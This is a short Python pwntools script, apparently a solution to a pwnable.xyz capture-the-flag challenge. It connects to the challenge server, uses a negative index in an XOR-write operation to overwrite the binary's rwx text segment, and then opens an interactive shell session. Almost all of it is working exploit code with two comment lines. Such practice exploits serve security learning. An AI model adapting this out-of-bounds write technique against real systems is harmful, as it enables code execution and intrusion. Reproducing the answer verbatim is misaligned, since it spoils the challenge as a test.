#rwx permission is assigned to the text area.
#using result[v6]=v5^v4 with v6 being minus value => overwrite the text area

from pwn import * 
s=remote("svc.pwnable.xyz",'30029')
print(s.recv(1024))
s.send("5011179274728592617 1 -262887\n")
print(s.recv(1024))
print(s.recv(1024))
s.send("0 0 0\n")
s.interactive()
s.close()